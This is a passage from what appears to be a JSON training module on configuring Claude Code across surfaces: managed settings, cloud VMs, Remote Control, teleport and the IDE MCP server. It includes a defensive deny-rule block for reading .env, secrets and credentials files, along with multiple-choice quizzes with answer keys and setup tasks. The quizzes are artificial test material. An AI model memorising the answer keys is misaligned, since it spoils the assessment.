file-based delivery does not reach\n  cloud VMs.\n\n□ Version gate: set \"requiredMinimumVersion\" in managed settings and confirm\n  older versions block at startup rather than silently ignoring the file.\n\n□ Third-party provider bypass: be aware that configuring CLAUDE_CODE_USE_BEDROCK,\n  CLAUDE_CODE_USE_VERTEX, or similar bypasses server-managed settings delivery\n  entirely, since those require a direct connection to api.anthropic.com.\n```"
   },
   {
    "heading": "Cloud Session Environments: Isolated VMs with Named Configurations",
    "body": "Claude Code on the web runs tasks on Anthropic-managed cloud infrastructure at `claude.ai/code`. Each session gets a **fresh, isolated VM** with your repository cloned. Understanding what this VM does and does not have at startup is essential for teams that want cloud sessions to work reliably.\n\n### What is pre-installed\n\nCloud session VMs come with a broad toolchain that covers most language ecosystems out of the box. For exact versions, ask Claude to run `check-tools` in a cloud session (this command only exists in cloud sessions).\n\n| Category | Included |\n|---|---|\n| Python | 3.x with pip, poetry, uv, black, mypy, pytest, ruff |\n| Node.js | 20, 21, 22 via nvm; npm, yarn, pnpm, bun, eslint, prettier, chromedriver |\n| Ruby | 3.1, 3.2, 3.3 with gem, bundler, rbenv |\n| PHP | 8.4 with Composer |\n| Java | OpenJDK 21 with Maven and Gradle |\n| Go | Latest stable with module support |\n| Rust | rustc and cargo |\n| C/C++ | GCC, Clang, cmake, ninja, conan |\n| Docker | docker, dockerd, docker compose |\n| Databases | PostgreSQL 16 (not running), Redis 7.0 (not running) |\n| Utilities | git, jq, yq, ripgrep, tmux, vim, nano |\n\nNote: `gh` CLI is **not** pre-installed. If you need it, add installation to your setup script and provide a `GH_TOKEN` environment variable — `gh` reads it automatically without needing `gh auth login`:\n\n```bash\n#!/bin/bash\napt update && apt install -y gh\n```\n\nBuilt-in GitHub tools are available without `gh`: Claude can read issues, list pull requests, fetch diffs, and post comments through the GitHub proxy using your connected account credentials.\n\n### Named environments\n\nA **named environment** is a reusable configuration object that specifies:\n- Network access level (None / Trusted / Full / Custom)\n- Environment variables (`.env` format, one `KEY=value` per line, no quotes around values)\n- A setup script (Bash, runs as root on Ubuntu 24.04, before Claude Code launches)\n\nYou manage environments from the web interface or from your terminal:\n\n```bash\n# Set the default environment for cloud sessions started from the terminal\n/remote-env\n```\n\nEnvironments are per-account, not per-repository. An environment named `strict` can be applied to any repository you work on.\n\n### Setup scripts and the environment cache\n\nThe setup script runs before Claude Code launches when a fresh VM is provisioned. After it completes, Anthropic snapshots the filesystem. Subsequent sessions in that environment start from the cached snapshot — the setup script does not re-run each time, keeping startup fast even with large toolchain installs. The cache expires after **roughly 7 days**, or immediately when you change the setup script or allowed network hosts. Resuming an existing session never re-runs the setup script.\n\n```bash\n#!/bin/bash\n# Example setup script — runs as root on Ubuntu 24.04\napt update && apt install -y gh || true   # || true prevents transient apt failures from blocking\n\n# Pull large Docker images so they are cached in the snapshot\ndocker compose pull &\nwait\n```\n\nThe cache stores files, not running processes. Services started by the setup script must be restarted per session. Use a `SessionStart` hook in `.claude/settings.json` (committed to the repo) for per-session service startup:\n\n```bash\nservice postgresql start\nservice redis-server start\n```\n\n### Network access levels\n\n| Level | What is allowed |\n|---|---|\n| **None** | No outbound connections |\n| **Trusted** | Allowlisted domains only (package registries, GitHub, cloud SDKs, container registries — ~100+ domains) |\n| **Full** | Any domain |\n| **Custom** | Your explicit domain list, optionally including the Trusted defaults |\n\nGitHub operations always use a separate security proxy regardless of network level — Claude's git client authenticates through a scoped credential, not your raw token. MCP connector traffic routes through Anthropic's servers, so enabled connectors work without adding their hosts to the Custom allowlist.\n\n### Resource limits\n\nCloud VMs run with approximate ceilings (may change over time):\n- 4 vCPUs\n- 16 GB of RAM\n- 30 GB of disk\n\nMemory-intensive builds (large Docker layers, >16 GB heap JVM processes) may be terminated. For workloads exceeding these limits, use Remote Control to run against your own hardware.\n\n### The `CLAUDE_CODE_REMOTE` environment variable\n\nInside cloud sessions, `CLAUDE_CODE_REMOTE` is set to `true`. Use this in `SessionStart` hooks and setup scripts to detect whether code is running in the cloud:\n\n```bash\nif [ \"$CLAUDE_CODE_REMOTE\" != \"true\" ]; then\n  exit 0\nfi\n# cloud-only setup here\n```\n\n### Rate limits and plan requirements\n\nCloud sessions (claude.ai/code) are in research preview. They are available for Pro, Max, and Team users, and for Enterprise users with premium seats or Chat + Claude Code seats. Cloud sessions share rate limits with all other Claude usage on the same account. Running multiple parallel cloud tasks consumes rate quota proportionally."
   },
   {
    "heading": "Remote Control and Teleport: Mobility Between Surfaces",
    "body": "Two features — Remote Control and `--teleport` — let you move between surfaces mid-session. They are commonly confused because they appear at the same URL (`claude.ai/code`), but they are completely different mechanisms.\n\n### Remote Control: expose a local session to any device\n\nRemote Control connects `claude.ai/code` or the Claude mobile app to a Claude Code session **running on your machine**. Your code executes locally the entire time; the web/mobile interface is just a window into it. This is fundamentally different from cloud sessions, where Claude runs on Anthropic VMs.\n\n```bash\n# Server mode: wait for remote connections, serve multiple sessions\nclaude remote-control\n\n# Interactive mode: start a normal session that is also remotely accessible\nclaude --remote-control\n# or shorthand:\nclaude --rc\n\n# From inside an active session:\n/remote-control\n# or shorthand:\n/rc\n```\n\nRemote Control requirements (all must be met):\n\n| Requirement | Why |\n|---|---|\n| claude.ai subscription (Pro, Max, Team, Enterprise) | API key auth is explicitly not supported |\n| Team/Enterprise: admin must enable Remote Control toggle | Off by default on those plans; toggle at claude.ai/admin-settings/claude-code |\n| `ANTHROPIC_API_KEY` must not be set, or must be un-approved | API key takes precedence and breaks OAuth-dependent features |\n| `CLAUDE_CODE_OAUTH_TOKEN` cannot be used | Inference-only; cannot establish Remote Control sessions |\n\nIf you see \"Remote Control is disabled by your organization's policy\", run `/status` first — the error has four distinct causes (API key active, admin toggle off, compliance incompatibility, or `disableRemoteControl` in managed settings).\n\n### Teleport: pull a cloud session into your terminal\n\nTeleport moves a session **from the web into your terminal**. You start a task in the browser at `claude.ai/code` (where it runs on Anthropic cloud infrastructure), then pull it into your local terminal to continue it with access to your local files and tools.\n\n```bash\n# Interactive session picker\nclaude --teleport\n\n# Direct by session ID\nclaude --teleport <session-id>\n\n# From inside an active local session:\n/teleport\n# or shorthand:\n/tp\n```\n\nTeleport requires a claude.ai subscription. The docs note: \"Teleport requires a claude.ai subscription.\" API key and token-based auth do not support it.\n\nRequirements for teleport to succeed:\n\n| Requirement | Why |\n|---|---|\n| claude.ai subscription | Cloud sessions require OAuth; teleport is part of that infrastructure |\n| Run from correct repository | Must be a checkout of the same repository the cloud session used |\n| Clean or stash-able working state | Teleport fetches the cloud session's branch; conflicts must be resolved |\n\n### `--remote-control` vs `claude remote-control`: do not confuse them\n\nThese are the same feature invoked differently, not different features:\n\n- `claude remote-control` (no `--`): server mode — stays running, accepts multiple remote connections, each gets its own session (optionally in a git worktree with `--spawn=worktree`)\n- `claude --remote-control` or `claude --rc`: interactive mode — normal session plus remote access simultaneously\n- `/remote-control` or `/rc`: from inside an existing session, attach Remote Control to that conversation\n\n### CLAUDE_CODE_REMOTE_SESSION_ID\n\nEach cloud session exposes `CLAUDE_CODE_REMOTE_SESSION_ID` as an environment variable inside the VM. Commits Claude creates in web sessions (from v2.1.179) include a `Claude-Session: <url>` git trailer automatically, and PR bodies include the session URL. To construct the URL manually:\n\n```bash\n# Inside a cloud session VM\necho \"https://claude.ai/code/${CLAUDE_CODE_REMOTE_SESSION_ID/#cse_/session_}\"\n```\n\n### Rate limit architecture under parallel cloud work\n\nCloud sessions draw from the same rate-limit pool as interactive claude.ai usage and local Claude Code sessions under the same account. On Team and Enterprise accounts, this pool is shared across the entire org.\n\nPractical planning guidance:\n- Multiple parallel cloud sessions with heavy tool use can exhaust hourly limits faster than a typical single-user interactive session.\n- There is no separate compute billing for cloud VMs — the only charge is inference tokens, same as local usage.\n- Use the built-in task monitoring at `claude.ai/code` to track session status."
   },
   {
    "heading": "IDE Context Exposure and the Built-in MCP Server",
    "body": "The VS Code extension does more than display a chat panel — it runs a local MCP server that the CLI connects to, silently shares your editor context with every prompt, and exposes two tools to the model. For teams writing `PreToolUse` hooks or permission allowlists, none of this is visible from the standard `/mcp` listing, which makes it the most common source of hook misconfiguration.\n\n### The built-in IDE MCP server\n\nWhen the extension is active, it starts a local MCP server named `ide` that binds to `127.0.0.1` on a random high port. The server is excluded from `/mcp` — the official docs explain: \"there's nothing to configure\" from a user perspective. But from a `PreToolUse` hook perspective, two tools this server exposes are callable by the model:\n\n| Tool name (as seen by hooks) | What it does | Writes? |\n|---|---|---|\n| `mcp__ide__getDiagnostics` | Returns language-server diagnostics (errors/warnings from VS Code's Problems panel). Optionally scoped to one file. | No |\n| `mcp__ide__executeCode` | Runs Python code in the active Jupyter notebook kernel. | Yes |\n\nThe server hosts a dozen tools total, but only these two are visible to the model. The rest are internal RPC the CLI uses for its own UI (opening diffs, reading selections, saving files) and are filtered out before the tool list reaches Claude.\n\nThe server authenticates the CLI using a fresh random token generated each time the extension activates. The token is written to a lock file under `~/.claude/ide/` with `0600` permissions in a `0700` directory — only the user running VS Code can read it. It is not reachable from other machines.\n\n### `mcp__ide__executeCode`: dual-consent model\n\n`executeCode` has an important security property: it cannot execute silently even if your `PreToolUse` hook allows it. The code is inserted as a new cell at the end of the active Jupyter notebook, and VS Code then shows a native Quick Pick dialog asking you to **Execute** or **Cancel**. Dismissing with Esc returns an error to Claude and nothing runs.\n\nThe tool also refuses outright if:\n- No Jupyter notebook is currently active\n- The Jupyter extension (`ms-toolsai.jupyter`) is not installed\n- The kernel is not Python\n\nThe docs are explicit on this: \"An allowlist entry for `mcp__ide__executeCode` lets Claude *propose* running a cell; the Quick Pick inside VS Code is what lets it *actually* run.\" If your organization policy prohibits Jupyter execution, you need both a `PreToolUse` deny rule for `mcp__ide__executeCode` and user training — the deny rule blocks the proposal, but the Quick Pick is a separate second gate.\n\n### Auto-injected editor context\n\nWhile the IDE extension is connected, the CLI includes your **current editor selection** and **the path of the active file** as additional context on every prompt you send. The transcript shows:\n\n```\n⧉ Selected 12 lines from src/auth/login.ts\n```\n\nThis happens automatically without any explicit `@`-mention. For sensitive files — `.env`, secrets configs, credential files — this is a data exposure risk.\n\nA `Read` deny rule prevents both the selected text and the open-file notice for that file from reaching Claude:\n\n```json\n// .claude/settings.json or managed-settings.json\n{\n  \"permissions\": {\n    \"deny\": [\n      \"Read(.env)\",\n      \"Read(.env.*)\",\n      \"Read(secrets/**)\",\n      \"Read(**/*credentials*)\"\n    ]\n  }\n}\n```\n\n### What the extension does not do\n\nThe extension bundles its own copy of the CLI binary for the chat panel. It does **not** add `claude` to your shell PATH. For `claude` to work in a terminal, the standalone CLI install is required separately.\n\nThis also means:\n- `claude mcp add` must be run from a terminal with a separately installed CLI.\n- The extension and CLI share conversation history, so `claude --resume` from a terminal can reopen an extension conversation.\n- Some CLI commands are not available in the extension panel: `!` bash shortcut, tab completion, interactive pickers like `/plugin` or `/resume`.\n\n### Permission modes in VS Code\n\nThe extension exposes `claudeCode.initialPermissionMode` in VS Code settings (not in `settings.json`). Valid values: `default`, `plan`, `acceptEdits`, `bypassPermissions`. Setting `bypassPermissions` is gated behind `claudeCode.allowDangerouslySkipPermissions` (default: false), which adds bypass permissions to the mode selector. The docs note: \"Use it only in sandboxes with no internet access.\" Do not set this on production developer machines."
   },
   {
    "heading": "Wiring It Together: A Team Setup Sequence",
    "body": "The concepts above are interdependent. Here is the sequence a platform team should follow when standing up Claude Code for the organization, with the rationale at each step.\n\n### Step 1: Standardize auth first\n\nEverything else follows from this decision. Determine whether your team needs cloud sessions, Remote Control, and teleport — if yes, you must use claude.ai OAuth (Teams or Enterprise). Set the auth lockdown in managed settings before anyone onboards, so auth drift is impossible:\n\n```json\n// /etc/claude-code/10-auth.json  (or via admin console for server-managed)\n{\n  \"requiredMinimumVersion\": \"2.1.150\"\n}\n```\n\nFor Teams/Enterprise, also configure the `forceRemoteSettingsRefresh` in server-managed settings and set org-wide restriction policy through the admin console.\n\n### Step 2: Deploy managed settings to all device classes\n\nFile-based managed settings require active deployment. Create a provisioning checklist:\n- Developer laptops: MDM profile (Jamf, Intune) or dotfiles provisioner writes to the system directory\n- CI runners: baked into the runner image\n- Dev containers: Dockerfile `COPY` or init script writes the file\n- Cloud sessions (Teams or Enterprise): configure via server-managed settings in the admin console\n\nVerify with `/status` on each device class — the `Setting sources` line confirms which managed source is active (remote, plist, HKLM, HKCU, or file).\n\n### Step 3: Commit shared config to the repository\n\nFor project-level config that must reach cloud sessions:\n\n```\nproject-root/\n├── .claude/\n│   ├── settings.json    # committed — permissions, hooks, plugins\n│   ├── agents/          # committed — shared subagent definitions\n│   └── rules/           # committed — content rules\n├── .mcp.json            # committed — shared MCP servers\n└── CLAUDE.md            # committed — project-level context\n```\n\n### Step 4: Configure a named cloud environment\n\nFor teams using cloud sessions, create a named environment in the web UI with:\n- Network level: `Trusted` (sufficient for most package manager work) or `Custom` if you need private registries\n- Environment variables: anything the session needs (visible to anyone who can edit the environment — no dedicated secrets store yet)\n- Setup script: installs anything not pre-installed (e.g., `gh` CLI with `apt install -y gh`)\n\nSet this environment as the default for cloud sessions with `/remote-env`.\n\n### Step 5: Document the IDE deny rules\n\nGiven that IDE selection auto-injects into every prompt, ensure developers know to add deny rules for sensitive files. Include the deny rules in the team's committed `.claude/settings.json` rather than asking each developer to configure them personally.\n\n### Common pitfalls summary\n\n| Pitfall | Symptom | Fix |\n|---|---|---|\n| API key and OAuth both set | Cloud sessions fail; Remote Control broken | `unset ANTHROPIC_API_KEY`; verify with `/status` |\n| `CLAUDE_CODE_OAUTH_TOKEN` used for Remote Control | \"Remote Control requires a full-scope login token\" | Run `claude auth login` for full-scope OAuth |\n| Managed settings file not deployed to a device class | Policy not enforced silently | MDM profile or provisioning script; verify with `/status` |\n| Server-managed settings bypassed by cloud provider env var | Policy not enforced even on authenticated users | Server-managed requires direct connection to api.anthropic.com; third-party provider env vars bypass it |\n| User-scope hook missing from cloud session | Cloud VM runs without expected tooling | Move hook to `.claude/settings.json` (committed) with `CLAUDE_CODE_REMOTE` guard |\n| gh CLI not found in cloud session | Commands fail | Add `apt update && apt install -y gh` to setup script; set `GH_TOKEN` env var |\n| `mcp__ide__*` tools not in PreToolUse allowlist | Hook rejects IDE diagnostics | Add `mcp__ide__getDiagnostics` to your hook's allowed-tool list |\n| Parallel cloud sessions draining rate limit | Sessions slow or queue unexpectedly | Monitor at claude.ai/code; budget parallelism based on plan rate limits |"
   }
  ],
  "preQuiz": [
   {
    "prompt": "Your team wants to use Remote Control so engineers can monitor Claude Code sessions from mobile. You set ANTHROPIC_API_KEY in each developer's shell profile. What actually happens?",
    "options": [
     "Remote Control works normally — API keys and OAuth are interchangeable for Remote Control.",
     "Remote Control is silently blocked because a set ANTHROPIC_API_KEY prevents the OAuth session that Remote Control requires.",
     "Remote Control requires an additional CLAUDE_CODE_OAUTH_TOKEN env var on top of ANTHROPIC_API_KEY.",
     "Remote Control only fails if the API key is a project key rather than a personal key."
    ],
    "correct": 1,
    "sectionIndices": [
     1
    ],
    "explanation": "A set ANTHROPIC_API_KEY silently blocks Remote Control. Remote Control requires claude.ai OAuth established via `/login`. Tokens from `claude setup-token` or CLAUDE_CODE_OAUTH_TOKEN are inference-only and also cannot establish Remote Control sessions."
   },
   {
    "prompt": "Your team standardizes on AWS Bedrock for all LLM calls. A developer notices that the channels feature, voice dictation, and `--teleport` never work. What is the root cause?",
    "options": [
     "Bedrock requires a separate `channelsEnabled: true` entry in managed settings that most teams forget to add.",
     "Third-party providers (Bedrock, Vertex, Foundry) and raw API keys disable channels, computer use, voice dictation, --teleport, and Remote Control.",
     "Channels work on Bedrock but require the AWS region to be us-east-1; the other features are unrelated.",
     "These features are disabled only when using Foundry, not Bedrock or Vertex."
    ],
    "correct": 1,
    "sectionIndices": [
     1
    ],
    "explanation": "Third-party providers (Bedrock, Vertex, Foundry) and raw API keys disable a wide set of features including channels, computer use, voice dictation, --teleport, /web-setup, /desktop migration, and Remote Control. Teams using these providers should not document those features as available."
   },
   {
    "prompt": "A team lead adds an MCP server config to the VS Code extension settings UI (not to ~/.claude/settings.json). A developer using the CLI on the same machine doesn't see the server. What went wrong?",
    "options": [
     "MCP servers added via the VS Code UI are stored in extension-native settings, which are not shared with the CLI; they must go in ~/.claude/settings.json to be shared.",
     "MCP servers added in VS Code are stored per-workspace; the developer must open the same workspace folder in CLI too.",
     "The VS Code extension bundles a private CLI that maintains its own MCP registry, separate from the system CLI's registry.",
     "The CLI requires a manual `claude mcp sync` command to pull from VS Code's extension settings."
    ],
    "correct": 0,
    "sectionIndices": [
     2
    ],
    "explanation": "~/.claude/settings.json is shared between CLI and the VS Code/JetBrains extensions. Extension-native settings (VS Code Extensions → Claude Code panel) are per-developer UI preferences only. MCP configs belong in ~/.claude/settings.json to be shared with the CLI."
   },
   {
    "prompt": "Your security team wants to prevent users from enabling Bypass permissions mode org-wide. They set `permissions.disableBypassPermissionsMode: 'disable'` in the admin console and push it remotely. Two weeks later, Desktop users report they can still enable Bypass. What did the team miss?",
    "options": [
     "The key name changed — it must be `disableBypassPermissions` without the `Mode` suffix in managed settings.",
     "Remotely pushed admin-console managed settings reach CLI and IDE only, not Desktop. For Desktop, the managed file must be deployed via MDM (Jamf/Kandji or Windows registry).",
     "Bypass mode is controlled by a separate Desktop-specific toggle in the admin console under Code in the desktop, not via managed settings keys.",
     "Desktop honors `disableBypassPermissionsMode` only when the user is enrolled in the Team plan, not Pro or Max."
    ],
    "correct": 1,
    "sectionIndices": [
     3
    ],
    "explanation": "Admin-console remotely pushed managed settings reach CLI and IDE only — NOT Desktop. To govern Desktop, you must deploy the managed settings file to disk via MDM (macOS: com.anthropic.claudefordesktop / Jamf / Kandji; Windows: registry SOFTWARE\\Policies\\Claude)."
   },
   {
    "prompt": "Your team distributes a plugin by setting it in `Install for this project` scope in the VS Code UI. A developer using the CLI on the same repo says the plugin doesn't appear. Why?",
    "options": [
     "Project-scope plugin installs from the VS Code UI are written to the repo's .vscode/ folder, which the CLI doesn't read.",
     "Project-scope plugin installs are shared between extension and CLI via the repo's .claude/settings.json, so the CLI should see them — the developer likely hasn't restarted the CLI after the change.",
     "The CLI requires a separate `claude plugin install` command; VS Code UI installs don't propagate.",
     "Plugin/marketplace config is shared extension↔CLI, so this should work; but a CLI restart is required to apply plugin changes after the install."
    ],
    "correct": 3,
    "sectionIndices": [
     2
    ],
    "explanation": "Plugin/marketplace config IS shared between the extension and CLI. However, a restart is required to apply plugin changes. The developer needs to restart their CLI session to pick up the newly installed plugin."
   },
   {
    "prompt": "You run `claude --remote 'Run the full test suite'` from a local repo that is not hosted on GitHub (it's on a private GitLab). What actually happens?",
    "options": [
     "The command fails immediately with an error — --remote requires a GitHub-hosted repo.",
     "Claude uploads the repo as a bundle (history + uncommitted tracked changes), creates a cloud session, and runs the task — but the session cannot push results back unless GitHub auth is configured.",
     "The command works identically to a GitHub repo because the web session just clones from the remote URL you have configured.",
     "Claude uploads only the uncommitted changes as a diff and applies them to a fresh Ubuntu VM without any history."
    ],
    "correct": 1,
    "sectionIndices": [
     5
    ],
    "explanation": "For non-GitHub repos, `claude --remote` uses the bundle path: it uploads history + uncommitted tracked changes (needs ≥1 commit, <100MB; untracked files excluded). Bundled sessions can't push back unless GitHub auth is separately configured."
   },
   {
    "prompt": "A cloud session's setup script installs several heavy dependencies. On the 8th session of the day, a developer notices the setup script runs again from scratch and takes 5 minutes. What is the most likely explanation?",
    "options": [
     "Cloud session caches are per-user; the 8th session exceeded the daily cache-use quota and triggered a rebuild.",
     "Setup scripts re-run on every resume by design — only SessionStart hooks are cached.",
     "The ~7-day cache expired, or the setup script itself changed, or the allowed-hosts list changed — any of these invalidates the cache and forces a rebuild.",
     "The cache only persists for 4 hours; after that all sessions rebuild from scratch regardless of changes."
    ],
    "correct": 2,
    "sectionIndices": [
     5
    ],
    "explanation": "Setup scripts re-run only on script change, allowed-hosts change, or ~7-day cache expiry. Any of these three conditions invalidates the cache. Resuming a session never re-runs the setup script — but a new session after cache expiry will."
   },
   {
    "prompt": "You want to restrict Desktop SSH connections to only hosts matching *.internal.company.com. You add sshHostAllowlist to managed settings. A developer then uses the CLI to SSH into an external server and it works fine. What is happening?",
    "options": [
     "sshHostAllowlist is honored by Desktop only — CLI, IDE extensions, and Bash-tool SSH calls all ignore it. It does not restrict egress.",
     "sshHostAllowlist blocks outbound SSH at the OS network layer, so CLI SSH also should be blocked — this suggests the managed settings file wasn't deployed correctly.",
     "sshHostAllowlist applies to both Desktop and CLI but only for sessions started via claude, not for raw ssh commands spawned as subprocesses.",
     "The allowlist only applies when the user is in a Remote Control session; direct CLI use bypasses it by design."
    ],
    "correct": 0,
    "sectionIndices": [
     3
    ],
    "explanation": "sshHostAllowlist is honored ONLY by Desktop. CLI, IDE extensions, and Bash-tool ssh commands all ignore it. It does not restrict network egress at the OS level — it only controls which hosts appear in Desktop's SSH connection dropdown."
   },
   {
    "prompt": "Your DevOps team enables Auto-fix PRs via the GitHub App for a repo that uses Atlantis for Terraform plan/apply. A day later, Atlantis unexpectedly runs a Terraform apply on production. What caused this?",
    "options": [
     "Auto-fix PRs bypass GitHub branch protection rules, allowing direct pushes that trigger Atlantis apply webhooks.",
     "Claude Code's Auto-fix PR replies post under your GitHub account, which can trigger issue_comment automation like Atlantis/Terraform/Actions running privileged operations.",
     "The GitHub App for Auto-fix PRs was granted org-admin permissions during setup, which elevated the session's capability to trigger Atlantis.",
     "Auto-fix PR comments use a special GitHub event type that Atlantis misinterprets as a manual apply trigger."
    ],
    "correct": 1,
    "sectionIndices": [
     5
    ],
    "explanation": "Auto-fix PR replies post under your GitHub account. This means they can trigger issue_comment automation (like Atlantis, Terraform, or GitHub Actions) that runs privileged operations. The lesson explicitly warns to audit existing automations before enabling Auto-fix PRs."
   },
   {
    "prompt": "A cloud session developer sets a DATABASE_URL environment variable in the environment config with the value `\"postgres://user:pass@host/db\"` (including the quotes). The app fails to connect. What is wrong?",
    "options": [
     "DATABASE_URL cannot contain special characters like @ or : in cloud environment variables — they must be percent-encoded.",
     "The environment variable value was stored with the literal quote characters because cloud env vars use .env format and values must NOT be quoted — quotes are stored literally.",
     "Cloud sessions require secrets to be injected via the setup script, not the environment variable UI.",
     "The variable name DATABASE_URL is reserved by the cloud VM's PostgreSQL installation and cannot be overridden."
    ],
    "correct": 1,
    "sectionIndices": [
     5
    ],
    "explanation": "Cloud environment variables use .env format and values must NOT be quoted — quotes are stored literally, not stripped. So `\"postgres://...\"` stores the quotes as part of the value, causing connection failures. The correct entry is DATABASE_URL=postgres://user:pass@host/db with no surrounding quotes."
   },
   {
    "prompt": "Your org is on ZDR (Zero Data Retention) with the Enterprise plan. A developer tries to open claude.ai/code to start a cloud session. What happens?",
    "options": [
     "ZDR orgs get cloud sessions but with reduced logging — session content is not retained after the session ends.",
     "ZDR orgs cannot use cloud sessions or /web-setup at all.",
     "ZDR orgs can use cloud sessions but only with the GitHub App auth method, not /web-setup.",
     "ZDR orgs must use --teleport from the CLI instead of the web UI to initiate cloud sessions."
    ],
    "correct": 1,
    "sectionIndices": [
     5
    ],
    "explanation": "ZDR (Zero Data Retention) orgs cannot use cloud sessions or /web-setup at all. This is a hard blocker — not a degraded mode."
   },
   {
    "prompt": "A developer uses `claude --teleport` to move their local session to cloud. The command fails. Their working tree has uncommitted changes to three files. What is the most likely cause?",
    "options": [
     "Teleport requires the branch to have an open pull request — it cannot teleport from a local-only branch.",
     "Teleport requires a clean git tree; uncommitted changes block the teleport.",
     "Teleport is disabled when using VS Code because the VS Code extension maintains its own session state.",
     "Teleport fails if the session has been running for more than 2 hours due to session token expiry."
    ],
    "correct": 1,
    "sectionIndices": [
     5
    ],
    "explanation": "Teleport requires a clean git tree (among other prerequisites: same non-fork repo, branch pushed to remote, claude.ai auth). Uncommitted changes block the teleport operation."
   },
   {
    "prompt": "Your team wants the Auto mode setting to be enforced only via managed settings and not allow a cloned repo's .claude/settings.json to inject autoMode classifier rules. Is this possible, and why?",
    "options": [
     "No — autoMode classifier rules are always read from .claude/settings.json in the current project, whether managed or not.",
     "Yes — autoMode classifier rules are deliberately not read from checked-in .claude/settings.json; they must come from managed settings so a cloned repo cannot inject trust rules.",
     "Yes, but only when disableAutoMode is also set to 'disable' in managed settings.",
     "No — classifier rules in managed settings are overridden by project-level .claude/settings.json because project settings have higher precedence."
    ],
    "correct": 1,
    "sectionIndices": [
     3
    ],
    "explanation": "autoMode classifier rules are deliberately NOT read from checked-in .claude/settings.json. This is a security boundary: a cloned repo cannot inject trust rules via project settings. Classifier rules must come from managed settings deployed via MDM or admin console."
   }
  ],
  "tasks": [
   {
    "id": "stage-9-task-auth-standardization",
    "afterSectionIdx": 1,
    "title": "Audit and standardize auth for Remote Control readiness",
    "instructions": "**Goal:** Verify your machine is using claude.ai OAuth (not an API key) and confirm Remote Control is reachable.\n\n1. Check whether ANTHROPIC_API_KEY is set in your current shell:\n```bash\necho ${ANTHROPIC_API_KEY:-'(not set)'}\n```\n\n2. If it is set, check whether it is defined in your shell profile and note the source:\n```bash\ngrep -r 'ANTHROPIC_API_KEY' ~/.bashrc ~/.zshrc ~/.profile ~/.bash_profile 2>/dev/null\n```\n\n3. Verify your current auth method:\n```bash\nclaude auth status\n```\nYou should see an OAuth token from claude.ai, NOT an API key auth.\n\n4. If you're using an API key, switch to OAuth:\n```bash\nclaude auth login\n```\nFollow the browser prompt. Unset the env var for this session:\n```bash\nunset ANTHROPIC_API_KEY\n```\nThen comment out or remove the export line from your shell profile.\n\n5. Confirm Remote Control is available after the switch by opening Claude Code and checking that the Remote Control option appears in the session menu (or run `/status` inside a Claude Code session and look for `Remote Control: available`).",
    "doneWhen": "`claude auth status` shows claude.ai OAuth and ANTHROPIC_API_KEY is not set in your shell environment."
   },
   {
    "id": "stage-9-task-managed-settings",
    "afterSectionIdx": 3,
    "title": "Add team-governed settings to ~/.claude/settings.json",
    "instructions": "**Goal:** Configure shared team settings in `~/.claude/settings.json` so they apply to both the CLI and VS Code/JetBrains extensions.\n\n1. Open (or create) your user-level settings file:\n```bash\nmkdir -p ~/.claude\n${EDITOR:-nano} ~/.claude/settings.json\n```\n\n2. Add the schema reference and a `channelsEnabled` key (if your team uses channels) and an initial permission default. Merge with any existing content — do not overwrite existing keys:\n```jsonc\n{\n  \"$schema\": \"https://json.schemastore.org/claude-code-settings.json\",\n  \"channelsEnabled\": true,\n  \"permissions\": {\n    \"defaultMode\": \"default\"\n  }\n}\n```\n\n3. Save the file, then verify it is valid JSON:\n```bash\npython3 -m json.tool ~/.claude/settings.json\n```\n\n4. Open a new Claude Code CLI session and run `/config` to confirm the permission mode reflects `default` (Ask permissions), and that no error appears about the settings file.\n\n5. If you have the VS Code extension installed, open the Claude Code panel — it should reflect the same permission mode without any extra configuration, confirming the shared settings file is being read.",
    "doneWhen": "`python3 -m json.tool ~/.claude/settings.json` exits 0 (valid JSON) and a new Claude Code session starts without settings-file errors."
   },
   {
    "id": "stage-9-task-cloud-session",
    "afterSectionIdx": 5,
    "title": "Run a task in a cloud session and teleport back",
    "instructions": "**Goal:** Launch a cloud session from a GitHub-hosted repo, observe what config travels, and practice teleporting to local.\n\n**Prerequisites:** A GitHub repo with at least one commit, claude.ai OAuth auth, Pro/Max/Team subscription.\n\n1. Ensure your branch is pushed and your working tree is clean:\n```bash\ngit status\ngit push\n```\n\n2. Launch a cloud session with a concrete, bounded task:\n```bash\nclaude --remote \"List the files in the repo root and show the content of any CLAUDE.md found. Then stop.\"\n```\n\n3. While it runs, open `claude.ai/code` in your browser to view the session in the web UI.\n\n4. Note which config traveled: look for CLAUDE.md being read (repo-level), and confirm that any `~/.claude/settings.json` additions you made in Task 2 are NOT visible in the cloud session (user-level config does not travel).\n\n5. When the task completes, practice teleporting: in a separate terminal with a clean working tree, run:\n```bash\nclaude --teleport\n```\nIf you have no active session to teleport, instead run `/tasks` inside a local Claude Code session and observe the session list.\n\n6. Check the session URL appears in git history if v2.1.179+ is installed:\n```bash\ngit log --format='%B' -1 | grep -i 'claude-session' || echo 'No Claude-Session trailer found (may need a commit from the cloud session)'\n```",
    "doneWhen": "A `claude --remote` task completes in a cloud session and you can view it at claude.ai/code, confirming the repo CLAUDE.md was read but ~/.claude/settings.json was not."
   }
  ],
  "visualizations": [
   {
    "id": "stage-9-v",
    "kind": "comparison-table",
    "title": "Surfaces & mobility",
    "textualSummary": "Key concepts of Surfaces & mobility: surfaces share one engine and config, auth method determines available features, config mobility across surfaces.",
    "columns": [
     "Concept",
     "In this stage"
    ],
    "rows": [
     {
      "label": "surfaces share one engine and config",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "auth method determines available features",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "config mobility across surfaces",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "managed (admin-governed) settings",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     }
    ]
   }
  ],
  "confusions": [
   {
    "misconception": "Skipping Surfaces & mobility.",
    "correction": "Each stage is load-bearing for the setup."
   },
   {
    "misconception": "These concepts are interchangeable.",
    "correction": "Each has a distinct role; see the definitions."
   }
  ],
  "quiz": [
   {
    "id": "stage-9-q1",
    "type": "multiple-choice",
    "prompt": "Your team standardizes on AWS Bedrock as the Claude provider. A developer asks why they can't use Remote Control from their VS Code extension. What is the correct explanation?",
    "options": [
     "Remote Control requires VS Code version 1.90+ and needs an extension update.",
     "Third-party providers like Bedrock disable Remote Control along with channels, computer use, voice dictation, and teleport.",
